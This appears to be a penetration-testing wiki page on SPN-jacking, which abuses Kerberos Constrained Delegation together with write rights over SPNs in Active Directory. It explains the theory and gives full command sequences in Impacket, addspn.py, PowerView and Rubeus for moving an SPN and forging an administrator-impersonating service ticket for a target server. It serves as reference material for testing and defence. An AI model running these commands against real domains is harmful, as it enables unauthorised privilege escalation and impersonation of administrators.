## Theory
This attack combines `Kerberos Constrained delegation` abuse and `DACL` abuse. A service configured for `Kerberos Constrained Delegation (KCD)` can impersonate users on a set of services. The "set of services" is specified in the constrained delegation configuration. It is a list of SPNs (`Service Principal Names`) written in the `msDS-AllowedToDelegateTo` attribute of the KCD service's object.

In standard KCD abuse scenarios, an attacker that gains control over a "KCD service" can operate lateral movement and obtain access to the other services/SPNs. Since KCD allows for impersonation, the attacker can also impersonate users (e.g. domain admins) on the target services. Depending on the SPNs, or if it's possible to modify it, the attacker could also gain admin access to the server the "listed SPN" belongs to.

On top of all that, if attacker is able to move a "listed SPN" from the original object to the another one, he could be able to compromise it. This is called SPN-jacking and it was intially discovered and explaine by Elad Shamir in this [post](https://www.semperis.com/blog/spn-jacking-an-edge-case-in-writespn-abuse/).

1. In order to "move the SPN", the attacker must have the right to edit the target object's ServicePrincipalName attribute (i.e. GenericAll, GenericWrite over the object orWriteProperty over the attribute (called WriteSPN since BloodHound 4.1), etc.).
2. If the "listed SPN" already belongs to an object, it must be removed from it first. This would require the same privileges (GenericAll, GenericWrite, etc.) over the SPN owner as well (a.k.a. "Live SPN-jacking"). Else, the SPN can be simply be added to the target object (a.k.a. "Ghost SPN-jacking").
## Exploit
!!! note
    In this scenario, we assume the Kerberos Constrained Delegation is configured with protocol transition in order to keep things simple. However, the SPN-jacking attack can be conducted on KCD without protocol transition as well (cf. RBCD technique).

    In this scenario (following Elad's post):

    - serverA is configured for KCD
    - serverB's SPN is listed in serverA's KCD configuration
    - serverC is the final target
    - attacker controls serverA, has at least WriteSPN over serverB (if needed, "live SPN-jacking"), and at least WriteSPN over serverC.
=== "UNIX-like"
    From UNIX-like machines, krbrelayx's addspn.py and Impacket example scripts (Python) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).
    ```bash
    # 1. show SPNs listed in the KCD configuration
    findDelegation.py -user 'serverA$' "$DOMAIN"/"$USER":"$PASSWORD"

    # 2. remove SPN from ServerB if required (live SPN-jacking)
    addspn.py --clear -t 'ServerB$' -u "$DOMAIN"/"$USER" -p "$PASSWORD" 'DomainController.domain.local'

    # 3. add SPN to serverC
    addspn.py -t 'ServerC$' --spn "cifs/serverB" -u "$DOMAIN"/"$USER" -p "$PASSWORD" -c 'DomainController.domain.local'

    # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
    getST -spn "cifs/serverB" -impersonate "administrator" 'domain/serverA$:$PASSWORD'

    # 5. Edit the ticket's SPN (service class and/or hostname)
    tgssub.py -in serverB.ccache -out newticket.ccache -altservice "cifs/serverC"
    ```
=== "Windows"
    From Windows machines, PowerView (PowerShell) and Rubeus (C#) can be used to conduct the different steps (manipulate SPNs, obtain and manipulate tickets).
    ```bash
    # 1. show SPNs listed in the KCD configuration
    Get-DomainObject -Identity ServerA$ -Properties 'msDS-AllowedToDelegateTo'

    # 2. remove SPN from ServerB if required (live SPN-jacking)
    Set-DomainObject -Identity ServerB$ -Clear 'ServicePrincipalName'

    # 3. add SPN to serverC
    Set-DomainObject -Identity ServerC$ -Set @{ServicePrincipalName='cifS/serverB'}

    # 4. request an impersonating service ticket for the SPN through S4U2self + S4U2proxy
    Rubeus.exe s4u /nowrap /msdsspn:"cifs/serverB" /impersonateuser:"administrator" /domain:"$DOMAIN" /user:"$USER" /password:"$PASSWORD"

    # 5. Edit the ticket's SPN (service class and/or hostname)
    Rubeus.exe tgssub /nowrap /altservice:"host/serverC" /ticket:"ba64ticket"
    ```